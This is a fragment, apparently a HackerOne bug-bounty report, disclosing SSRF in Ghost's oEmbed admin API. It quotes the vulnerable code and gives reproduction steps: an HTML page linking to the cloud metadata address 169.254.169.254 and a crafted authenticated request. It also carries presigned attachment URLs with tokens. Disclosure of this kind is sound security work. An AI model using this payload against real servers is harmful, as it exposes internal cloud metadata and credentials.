class=\"p\"\u003e;\u003c/span\u003e\n            \u003cspan class=\"p\"\u003e}).\u003c/span\u003e\u003cspan class=\"nx\"\u003ethen\u003c/span\u003e\u003cspan class=\"p\"\u003e((\u003c/span\u003e\u003cspan class=\"nx\"\u003eresponse\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n                \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"o\"\u003e!\u003c/span\u003e\u003cspan class=\"nx\"\u003eresponse\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n                    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nx\"\u003eunknownProvider\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eurl\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n                \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n                \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nx\"\u003eresponse\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n            \u003cspan class=\"p\"\u003e}).\u003c/span\u003e\u003cspan class=\"k\"\u003ecatch\u003c/span\u003e\u003cspan class=\"p\"\u003e(()\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n                \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nx\"\u003eunknownProvider\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eurl\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n            \u003cspan class=\"p\"\u003e});\u003c/span\u003e\n        \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003cspan class=\"p\"\u003e};\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eIf we add breakpoint in fetchOembedData() function. And when will go across all lines of code in this function. We will notice interesting function that is call \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2FTryGhost%2FGhost%2Fblob%2Fmaster%2Fcore%2Fserver%2Fapi%2Fcanary%2Foembed.js%23L109\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003egetOembedUrlFromHTML()\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"nx\"\u003eFile\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"nx\"\u003eGhost\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"nx\"\u003ecore\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"nx\"\u003eserver\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"nx\"\u003eapi\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"nx\"\u003ecanary\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"nx\"\u003eoembed\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ejs\u003c/span\u003e\n\n\u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"nx\"\u003efetchOembedData\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eurl\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"kd\"\u003elet\u003c/span\u003e \u003cspan class=\"nx\"\u003eprovider\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e({\u003c/span\u003e\u003cspan class=\"nx\"\u003eurl\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003eprovider\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003efindUrlWithProvider\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eurl\u003c/span\u003e\u003cspan class=\"p\"\u003e));\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eprovider\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nx\"\u003eknownProvider\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eurl\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nx\"\u003erequest\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eurl\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"na\"\u003emethod\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eGET\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n        \u003cspan class=\"na\"\u003etimeout\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"mi\"\u003e2\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e \u003cspan class=\"mi\"\u003e1000\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n        \u003cspan class=\"na\"\u003efollowRedirect\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"kc\"\u003etrue\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n        \u003cspan class=\"na\"\u003eheaders\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n            \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003euser-agent\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eGhost(https://github.com/TryGhost/Ghost)\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\n        \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}).\u003c/span\u003e\u003cspan class=\"nx\"\u003ethen\u003c/span\u003e\u003cspan class=\"p\"\u003e((\u003c/span\u003e\u003cspan class=\"nx\"\u003eresponse\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eresponse\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eurl\u003c/span\u003e \u003cspan class=\"o\"\u003e!==\u003c/span\u003e \u003cspan class=\"nx\"\u003eurl\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n            \u003cspan class=\"p\"\u003e({\u003c/span\u003e\u003cspan class=\"nx\"\u003eurl\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003eprovider\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003efindUrlWithProvider\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eresponse\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eurl\u003c/span\u003e\u003cspan class=\"p\"\u003e));\u003c/span\u003e\n        \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n        \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eprovider\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n            \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nx\"\u003eknownProvider\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eurl\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n        \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n        \u003cspan class=\"kd\"\u003econst\u003c/span\u003e \u003cspan class=\"nx\"\u003eoembedUrl\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003egetOembedUrlFromHTML\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eresponse\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ebody\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n        \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eoembedUrl\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n            \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nx\"\u003erequest\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eoembedUrl\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n                \u003cspan class=\"na\"\u003emethod\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eGET\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n                \u003cspan class=\"na\"\u003ejson\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"kc\"\u003etrue\u003c/span\u003e\n            \u003cspan class=\"p\"\u003e}).\u003c/span\u003e\u003cspan class=\"nx\"\u003ethen\u003c/span\u003e\u003cspan class=\"p\"\u003e((\u003c/span\u003e\u003cspan class=\"nx\"\u003eresponse\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n                \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nx\"\u003eresponse\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ebody\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n            \u003cspan class=\"p\"\u003e}).\u003c/span\u003e\u003cspan class=\"k\"\u003ecatch\u003c/span\u003e\u003cspan class=\"p\"\u003e(()\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"p\"\u003e{});\u003c/span\u003e\n        \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e});\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThis \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2FTryGhost%2FGhost%2Fblob%2Fmaster%2Fcore%2Fserver%2Fapi%2Fcanary%2Foembed.js%23L70\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003efunction\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e is responsible for getting oEmbed URL from external resources.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"nx\"\u003eFile\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"nx\"\u003eGhost\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"nx\"\u003ecore\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"nx\"\u003eserver\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"nx\"\u003eapi\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"nx\"\u003ecanary\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"nx\"\u003eoembed\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ejs\u003c/span\u003e\n\n\u003cspan class=\"kd\"\u003econst\u003c/span\u003e \u003cspan class=\"nx\"\u003egetOembedUrlFromHTML\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ehtml\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nx\"\u003echeerio\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003elink[type=\u0026quot;application/json+oembed\u0026quot;]\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003ehtml\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nx\"\u003eattr\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003ehref\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"p\"\u003e};\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u0026quot;oEmbed is a format for allowing an embedded representation of a URL on third party sites. The simple API allows a website to display embedded content (such as photos or videos) when a user posts a link to that resource, without having to parse the resource directly.\u0026quot;\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003eAnd here we can notice before and after executing getOembedUrlFromHTML() function don’t exist any validation which can prevent against from the SSRF attacks.  \u003c/p\u003e\n\n\u003ch2 id=\"steps-to-reproduce\"\u003eSteps To Reproduce:\u003c/h2\u003e\n\n\u003cp\u003eCurrently, we know how we can bypass validation in vulnerable route and now we can easily create exploit for this.\u003c/p\u003e\n\n\u003cp\u003eFirst of all, we should create an HTML page with  \u0026quot;link[type=\u0026quot;application/json+oembed”]” malicious URL which we would like to discover:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight html\"\u003e\u003ccode\u003e\u003cspan class=\"cp\"\u003e\u0026lt;!DOCTYPE html\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;html\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;head\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;meta\u003c/span\u003e \u003cspan class=\"na\"\u003echarset=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;UTF-8\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;title\u0026gt;\u003c/span\u003eSecurity Testing\u003cspan class=\"nt\"\u003e\u0026lt;/title\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;link\u003c/span\u003e \u003cspan class=\"na\"\u003erel=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;alternate\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;application/json+oembed\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ehref=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;http://169.254.169.254/metadata/v1.json\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/head\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;body\u0026gt;\u0026lt;/body\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/html\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAnd serve this page by the Python SimpleHTTPServer module:\u003c/p\u003e\n\n\u003cp\u003e\u003ccode\u003epython -m SimpleHTTPServer 8000\u003c/code\u003e\u003c/p\u003e\n\n\u003cp\u003eIf your target is located in not your local network you can use ngrok library for creating a tunnel to your HTML page.\u003c/p\u003e\n\n\u003cp\u003eAnd send the following request with publisher Cookies\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eGET /ghost/api/v3/admin/oembed/?url=http://169.254.169.254/metadata/v1.json\u0026amp;type=embed HTTP/1.1\nHost: YOUR_WEBSITE\nConnection: keep-alive\nAccept: application/json, text/javascript, */*; q=0.01\nX-Requested-With: XMLHttpRequest\nX-Ghost-Version: 3.5\nApp-Pragma: no-cache\nUser-Agent: Mozilla/5.0\nContent-Type: application/json; charset=UTF-8\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US;\nCookie: ghost-admin-api-session=YOUR_SESSION\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAnd we finally receive a response from the internal DigitalOcean service with my Droplet MetaData. \u003cbr\u003e\nSSRF vulnerability is working! 🥳\u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-reference\" data-attachment-filename=\"2020-02-11_17.07.09.jpg\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/uhMWrcSeLT9gmA25QFQK5okF?response-content-disposition=attachment%3B%20filename%3D%222020-02-11_17.07.09.jpg%22%3B%20filename%2A%3DUTF-8%27%272020-02-11_17.07.09.jpg\u0026amp;response-content-type=image%2Fjpeg\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQRF2F3DNN%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T065414Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCq%2BvKnwl6LFdj00DiqFKaUHM8vK%2Fo1tPHwYahCeGa93QIgIGXi89nBgDj4GiNdSy8pbzTFSts%2FsTmVKSM%2B7%2BKO9T4qtAMIVxABGgwwMTM2MTkyNzQ4NDkiDC9ugoHsMNk43keJ8SqRA8JrBBYsK5T0HiaJ%2F4T50sG1Ri6J%2BT91kOgNavpYRolFX7jpLcV0V81FUABPzsjSnAxRmYBypjIaPqZGQ8oq%2F9n27wPLgj8hUTl8O3SfU1GWCMHbROvW%2BF2K77xGt0sJKNZYVxNdbqrYwCp5MFfMpJjwvv%2BhMkb%2BfRRyL7GEsu82VMU41lKH3RgrBDJApguUYlLANZ1Ej8ImBTuQa0PTHDqpwoWpjaPcrnIHZqTdHOI5Wm1eCoy5eaHGFikwjjvjuMJ%2F1a5ex%2FCIOhGcwoqCBDet1aBO%2BZq78RzS1QY34XnoChAp%2BaikZB20FcxjUwn%2BkvJECosM%2B4F4PQHepofUS3ejTLZPjeYi9qQNjzq%2Fm%2Fv%2FV4Vqc3IwmTFe06OdDxIgpZyAcTQoSU8vA7sbEDpB%2F3XQDS%2BUqZejbvdrbfU8WGZYnfYRHIKZtByJaRcPB8vqFX9lX0oeLxz0IEswNXH%2FFNMPBsLv79pLu3OV6Lzfbgb36AT8ui2UZLwoOGRrSo71Tb%2FsYvBelBr2drk9Yi%2Fa%2FnGwML2Fq%2F8FOusBbN3FmFgpQ8hwRzpol0ZxBWjfkVayY1CeW8JmiNjsl1ndCgMmcPk10W64GF1qbk7fF0uPQopY1SymUfLnKrk2DYd5OUiFjtVktJLGKZ7wkgrDfWYDpQHSQRJQyMvnd2nX1QfEA0AlGzRulOvM2iwTIk241T4DuFrDCiCqYL8Mv%2FPeDbSAy7t6gkKpJ8C2PUVCIivsXSH1HvLfNTen1g5wD0tpM%2FnXwZxdxfuh8W3doYRnkWcmf8W%2F2IdcL3V8Ca3%2FV7qrIFxbsZIzSmpnSBl18cNkli7atg7%2FBcRNrqYiFsXMe5OsMSXyZkZK%2BQ%3D%3D\u0026amp;X-Amz-Signature=fb742b234a8ea259366556de2f331eb0851866f261f39411d2ac1fff0d503cfe\" data-attachment-type=\"image/jpeg\"\u003e2020-02-11_17.07.09.jpg (F713098)\u003c/a\u003e\u003c/p\u003e\n\n\u003ch2 id=\"supporting-material-references\"\u003eSupporting Material/References:\u003c/h2\u003e\n\n\u003cul\u003e\n\u003cli\u003eOS: macOS current\u003c/li\u003e\n\u003cli\u003eNode.js: 10.15.2\u003c/li\u003e\n\u003cli\u003eNPM: 6.11.3\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch1 id=\"wrap-up\"\u003eWrap up\u003c/h1\u003e\n\n\u003cul\u003e\n\u003cli\u003eI contacted the maintainer to let them know: Yes\u003c/li\u003e\n\u003cli\u003eI opened an issue in the related repository: No\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eAttacker with publisher role (editor, author, contributor, administrator) in a blog may be able to leverage this to make arbitrary GET requests in a Ghost Blog instance\u0026#39;s to internal / external network.\u003c/p\u003e\n","weakness":{"id":68,"name":"Server-Side Request Forgery (SSRF)"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":713079,"file_name":"2020-02-11_17.06.04.jpg","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/8R6BtYCJ4Ci28myo5foMTcNe?response-content-disposition=attachment%3B%20filename%3D%222020-02-11_17.06.04.jpg%22%3B%20filename%2A%3DUTF-8%27%272020-02-11_17.06.04.jpg\u0026response-content-type=image%2Fjpeg\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRF2F3DNN%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T065414Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCq%2BvKnwl6LFdj00DiqFKaUHM8vK%2Fo1tPHwYahCeGa93QIgIGXi89nBgDj4GiNdSy8pbzTFSts%2FsTmVKSM%2B7%2BKO9T4qtAMIVxABGgwwMTM2MTkyNzQ4NDkiDC9ugoHsMNk43keJ8SqRA8JrBBYsK5T0HiaJ%2F4T50sG1Ri6J%2BT91kOgNavpYRolFX7jpLcV0V81FUABPzsjSnAxRmYBypjIaPqZGQ8oq%2F9n27wPLgj8hUTl8O3SfU1GWCMHbROvW%2BF2K77xGt0sJKNZYVxNdbqrYwCp5MFfMpJjwvv%2BhMkb%2BfRRyL7GEsu82VMU41lKH3RgrBDJApguUYlLANZ1Ej8ImBTuQa0PTHDqpwoWpjaPcrnIHZqTdHOI5Wm1eCoy5eaHGFikwjjvjuMJ%2F1a5ex%2FCIOhGcwoqCBDet1aBO%2BZq78RzS1QY34XnoChAp%2BaikZB20FcxjUwn%2BkvJECosM%2B4F4PQHepofUS3ejTLZPjeYi9qQNjzq%2Fm%2Fv%2FV4Vqc3IwmTFe06OdDxIgpZyAcTQoSU8vA7sbEDpB%2F3XQDS%2BUqZejbvdrbfU8WGZYnfYRHIKZtByJaRcPB8vqFX9lX0oeLxz0IEswNXH%2FFNMPBsLv79pLu3OV6Lzfbgb36AT8ui2UZLwoOGRrSo71Tb%2FsYvBelBr2drk9Yi%2Fa%2FnGwML2Fq%2F8FOusBbN3FmFgpQ8hwRzpol0ZxBWjfkVayY1CeW8JmiNjsl1ndCgMmcPk10W64GF1qbk7fF0uPQopY1SymUfLnKrk2DYd5OUiFjtVktJLGKZ7wkgrDfWYDpQHSQRJQyMvnd2nX1QfEA0AlGzRulOvM2iwTIk241T4DuFrDCiCqYL8Mv%2FPeDbSAy7t6gkKpJ8C2PUVCIivsXSH1HvLfNTen1g5wD0tpM%2FnXwZxdxfuh8W3doYRnkWcmf8W%2F2IdcL3V8Ca3%2FV7qrIFxbsZIzSmpnSBl18cNkli7atg7%2FBcRNrqYiFsXMe5OsMSXyZkZK%2BQ%3D%3D\u0026X-Amz-Signature=99a6e6888ab6dd4c24d3a2dc38cbd904f0e1d7a24504b7418ec5d186debd2356","file_size":88145,"type":"image/jpeg"},{"id":713080,"file_name":"2020-02-11_17.06.41.jpg","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/QXGSvBzFWe67r3pREuWmynY2?response-content-disposition=attachment%3B%20filename%3D%222020-02-11_17.06.41.jpg%22%3B%20filename%2A%3DUTF-8%27%272020-02-11_17.06.41.jpg\u0026response-content-type=image%2Fjpeg\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRF2F3DNN%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T065414Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCq%2BvKnwl6LFdj00DiqFKaUHM8vK%2Fo1tPHwYahCeGa93QIgIGXi89nBgDj4GiNdSy8pbzTFSts%2FsTmVKSM%2B7%2BKO9T4qtAMIVxABGgwwMTM2MTkyNzQ4NDkiDC9ugoHsMNk43keJ8SqRA8JrBBYsK5T0HiaJ%2F4T50sG1Ri6J%2BT91kOgNavpYRolFX7jpLcV0V81FUABPzsjSnAxRmYBypjIaPqZGQ8oq%2F9n27wPLgj8hUTl8O3SfU1GWCMHbROvW%2BF2K77xGt0sJKNZYVxNdbqrYwCp5MFfMpJjwvv%2BhMkb%2BfRRyL7GEsu82VMU41lKH3RgrBDJApguUYlLANZ1Ej8ImBTuQa0PTHDqpwoWpjaPcrnIHZqTdHOI5Wm1eCoy5eaHGFikwjjvjuMJ%2F1a5ex%2FCIOhGcwoqCBDet1aBO%2BZq78RzS1QY34XnoChAp%2BaikZB20FcxjUwn%2BkvJECosM%2B4F4PQHepofUS3ejTLZPjeYi9qQNjzq%2Fm%2Fv%2FV4Vqc3IwmTFe06OdDxIgpZyAcTQoSU8vA7sbEDpB%2F3XQDS%2BUqZejbvdrbfU8WGZYnfYRHIKZtByJaRcPB8vqFX9lX0oeLxz0IEswNXH%2FFNMPBsLv79pLu3OV6Lzfbgb36AT8ui2UZLwoOGRrSo71Tb%2FsYvBelBr2drk9Yi%2Fa%2FnGwML2Fq%2F8FOusBbN3FmFgpQ8hwRzpol0ZxBWjfkVayY1CeW8JmiN